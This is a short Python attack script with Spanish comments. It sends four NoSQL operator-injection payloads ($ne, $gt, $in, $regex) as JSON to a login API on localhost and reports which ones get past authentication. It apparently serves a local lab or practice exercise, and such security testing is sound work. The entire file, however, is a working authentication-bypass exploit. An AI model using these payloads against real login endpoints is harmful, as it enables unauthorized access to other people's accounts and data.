import requests
import json

URL = 'http://localhost:3000/api/login'

print("[*] ATAQUE DE INYECCIÓN NoSQL")
print("-" * 50)

# Diferentes tipos de inyecciones a intentar
inyecciones = [
    {
        'nombre': 'Inyección $ne (no es igual)',
        'username': {'$ne': None},
        'password': {'$ne': None}
    },
    {
        'nombre': 'Inyección $gt (mayor que)',
        'username': {'$gt': ''},
        'password': {'$gt': ''}
    },
    {
        'nombre': 'Inyección $in (está en)',
        'username': {'$in': ['admin', 'root']},
        'password': {'$ne': None}
    },
    {
        'nombre': 'Inyección $regex (coincidencia)',
        'username': {'$regex': '.*'},
        'password': {'$ne': None}
    }
]

for inyeccion in inyecciones:
    print(f"\n[*] Probando: {inyeccion['nombre']}")
    
    data = {
        'username': inyeccion['username'],
        'password': inyeccion['password']
    }
    
    try:
        response = requests.post(URL, json=data)
        resultado = response.json()
        
        if 'Login exitoso' in resultado.get('message', ''):
            print(f"    [✓] ¡VULNERABILIDAD ENCONTRADA!")
            print(f"    Respuesta: {resultado}")
        else:
            print(f"    [✗] No funcionó: {resultado.get('message')}")
            
    except Exception as e:
        print(f"    [!] Error: {e}")

print("\n" + "-" * 50)
print("[*] Pruebas completadas print (Hello world)")
